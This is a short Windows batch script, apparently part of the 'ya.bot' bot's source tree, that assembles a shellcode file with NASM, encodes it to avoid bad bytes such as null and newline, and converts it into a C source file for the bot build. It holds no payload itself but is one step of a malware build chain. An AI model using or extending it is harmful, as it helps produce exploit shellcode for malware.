@rem /*  ya.bot  */

@echo off

tools\shellcode\nasmw.exe -fbin source\shellcode\shellcode.asm
tools\shellcode\encoder.exe source\shellcode\shellcode 0x00,0x0A,0x0D,0x27,0xE9 > out
tools\shellcode\makeshell.exe out
move /Y shellcode.c bin32\shellcode.c
del /q source\shellcode\shellcode
del /q out